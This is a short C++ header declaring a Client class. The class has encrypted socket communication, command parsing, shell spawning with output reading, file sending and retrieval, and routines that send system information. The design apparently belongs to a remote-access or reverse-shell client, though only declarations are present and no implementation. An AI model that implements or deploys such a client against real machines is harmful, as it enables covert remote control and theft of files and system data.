#ifndef __CLIENT
#define __CLIENT
#include "headers.hpp"
#include "Cipher.hpp"

class Client{
	private:
		LCipher txtCipher;
		std::mutex mtxMutex;
		int sckSocket;
	public:
		volatile bool isKeepRunning = true;
		volatile bool isRunningShell = false;
		bool Connect(c_char*, c_char*);
		void CloseConnection();
		
		int ssSendBinary(const char*);
		int ssRecvBinary(char*&, int);
		int ssSendStr(const std::string&);
		int ssRecvStr(std::string&, int);
		
		bool ParseCommand(char*&);
		
		bool SendFile(const std::string);
		void SpawnShell(const std::string);
		void threadReadShell(int&);
		bool SendInfo();
		bool SendFullInfo();
		void RetrieveFile(u64, c_char, const std::string);
};

#endif
